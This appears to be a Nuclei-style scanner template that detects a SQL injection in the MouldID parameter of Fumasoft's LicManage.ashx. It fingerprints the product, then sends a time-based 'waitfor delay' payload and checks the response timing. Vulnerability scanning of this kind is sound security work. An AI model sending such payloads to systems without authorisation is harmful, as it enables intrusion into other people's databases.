id: poc-yaml-fumasoft-licmanage-ashx-sqli
info:
  name: Fumasoft LicManage.ashx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    The Fumasoft LicManage.ashx endpoint is vulnerable to SQL injection through the `MouldID` parameter. Exploitation can lead to arbitrary SQL execution.

variables:
  t1: "{{rand_int(4, 9)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "孚盟云"
        part: body
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/Ajax/LicManage.ashx"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "action=ExtensionPermit&MouldID='waitfor+delay'0:0:{{t1}}'--&BillFID=1"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "false"
        part: body
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
